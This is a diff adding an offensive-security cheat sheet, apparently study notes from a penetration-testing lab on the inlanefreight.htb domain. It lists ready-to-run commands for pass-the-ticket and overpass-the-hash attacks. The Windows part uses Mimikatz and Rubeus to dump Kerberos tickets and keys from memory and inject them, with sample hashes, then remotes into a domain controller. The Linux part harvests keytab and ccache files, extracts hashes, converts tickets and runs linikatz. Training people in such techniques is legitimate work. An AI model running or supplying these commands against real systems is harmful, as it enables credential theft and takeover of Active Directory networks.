@@ -1,0 +1,186 @@
+------------------------------
+PtT from Windows - Export Tickets
+------------------------------
+
+1. Mimikatz
+
+mimikatz.exe
+privilege::debug
+sekurlsa::tickets /export
+exit
+dir *.kirbi
+
+- The tickets that end with $ correspond to the computer account, which needs a ticket to interact with the Active Directory 
+- User tickets have the user's name, followed by an @ that separates the service name and the domain, for example: [randomvalue]-username@service-domain.local.kirbi 
+(Note: If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account)
+
+2. Rubeus
+
+Rubeus.exe dump /nowrap
+(Note: To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.)
+
+------------------------------------------------------------
+Pass the Key (OverPass the Hash) - Export Kerberos Keys
+------------------------------------------------------------
+
+1. Mimikatz
+
+mimikatz.exe
+privilege::debug
+sekurlsa::ekeys
+
+(Now that we have access to the AES256_HMAC and RC4_HMAC keys, we can perform the OverPass the Hash aka. Pass the Key attack using Mimikatz and Rubeus.)
+
+------------------------------------------------------------
+          Pass the Key (OverPass the Hash) - PtK
+------------------------------------------------------------
+
+1. Mimikatz
+
+sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
+
+2. Rubeus
+
+Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
+
+
+------------------------------
+    PtT from Windows - PtT
+------------------------------
+
+1. Mimikatz
+
+kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
+(Note: Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module misc to launch a new command prompt window with the imported ticket using the misc::cmd command.)
+
+
+2. Rubeus
+
+Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
+Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi (ticket exported from mimikatz)
+Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/...SNIP...
+
+- Convert .kirbi to Base64 Format
+
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi")
+
+
+------------------------------
+PtT from Windows - PS Remoting
+------------------------------
+- https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/running-remote-commands?view=powershell-7.5&viewFallbackFrom=powershell-7.2
+
+1. Mimikatz
+
+mimikatz.exe
+privilege::debug
+kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+
+powershell
+Enter-PSSession -ComputerName DC01
+
+2. Rubeus
+
+2.1 Create a sacrificial process with Rubeus
+
+Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+- The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option /ptt to import the ticket into our current session and connect to the DC using PowerShell Remoting 
+
+Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
+
+
+------------------------------
+PtT from Linux - Identifying AD Integration
+------------------------------
+
+realm list 
+- Check if Linux machine is domain-joined
+
+ps -ef | grep -i "winbind\|sssd" 
+- look for other tools used to integrate Linux with Active Directory such as sssd or winbind
+
+------------------------------
+PtT from Linux - Finding Kerberos Tickets
+------------------------------
+
+find / -name *keytab* -ls 2>/dev/null
+(Note: To use a keytab file, we must have read and write (rw) privileges on the file.)
+
+crontab -l
+cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
+(In the above script, we notice the use of kinit, which means that Kerberos is in use)
+
+------------------------------
+PtT from Linux - Finding ccache files
+------------------------------
+
+env | grep -i krb5
+ls -la /tmp
+
+------------------------------
+PtT from Linux - Import ccache files
+------------------------------
+
+cp /tmp/krb5cc_647401106_I8I133 .
+export KRB5CCNAME=/root/krb5cc_647401106_I8I133
+klist
+
+------------------------------
+PtT from Linux - Abusing KeyTab files
+------------------------------
+
+klist -k -t /opt/specialfiles/carlos.keytab
+(Note: kinit is case-sensitive, so be sure to use the name of the principal as shown in klist. In this case, the username is lowercase, and the domain name is uppercase)
+
+------------------------------
+PtT from Linux - Impersonating a user with a KeyTab
+------------------------------
+
+klist
+smbclient //dc01/carlos -k -c ls
+
+------------------------------
+PtT from Linux - KeyTab Extract
+------------------------------
+- https://github.com/sosdave/KeyTabExtract
+
+python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
+(With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeusexport KRB5CCNAME  or attempt to crack the hashes to obtain the plaintext password.)
+
+
+------------------------------
+PtT from Linux - Evin-WinRM with Kerberos
+------------------------------
+
+sudo apt-get install krb5-user -y
+
+/etc/krb5.conf
+"""
+cat /etc/krb5.conf
+[libdefaults]
+        default_realm = INLANEFREIGHT.HTB
+...SNIP...
+[realms]
+    INLANEFREIGHT.HTB = {
+        kdc = dc01.inlanefreight.htb
+    }
+...SNIP...
+"""
+
+evil-winrm -i dc01 -r inlanefreight.htb
+
+------------------------------
+PtT from Linux - Ticket Converter
+------------------------------
+
+impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
+
+Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
+
+------------------------------
+PtT from Linux - Linikatz
+------------------------------
+- https://github.com/CiscoCXSecurity/linikatz
+
+./linikatz.sh
+
